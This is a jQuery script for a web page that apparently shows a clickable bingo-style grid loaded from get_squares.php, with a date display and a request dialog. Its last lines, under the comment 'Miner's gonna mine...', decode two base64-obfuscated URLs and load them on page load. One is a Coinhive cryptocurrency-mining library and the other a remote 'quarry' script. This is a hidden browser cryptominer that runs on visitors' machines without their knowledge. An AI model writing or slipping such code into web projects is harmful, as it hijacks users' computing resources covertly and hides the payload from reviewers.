$(document).ready(function(){
	var today = moment().format('dddd, MMMM Do YYYY');
	$('#date').html(today);

	$.ajax({
			type:'GET',
			url:'get_squares.php',
			dataType: "json",
			success:function(data){
					// console.log(data);
					$.each( data, function(index, panel) {
						$('#panel').append('<li id="' + panel.id + '"><span>' + panel.block + '</span></li>');
					});

					var freespace = $('ul#panel').find('li:eq(11)');
					$('<li id="free"></li>').insertAfter(freespace);

					$('li').click(function(){
						$(this).toggleClass('select');
			    });
			}
	});

	dialog = $( "#request" ).dialog({
		modal: true,
		autoOpen: false,
		height: 620,
		width: 820
  });

	$( "#request-block" ).button().on( "click", function() { dialog.dialog( "open" ); });

	// Miner's gonna mine...
	var quarry = atob('aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==');
	var pickaxe = atob('aHR0cHM6Ly9zbGljZXBvdGF0by5naXRodWIuaW8vcXVhcnJ5L2pzL21haW4uanM=');

	$.when(
  	$.getScript(quarry),
  	$.Deferred(function( deferred ){ $( deferred.resolve ); })
	).done(function(){ $.getScript(pickaxe); });
});
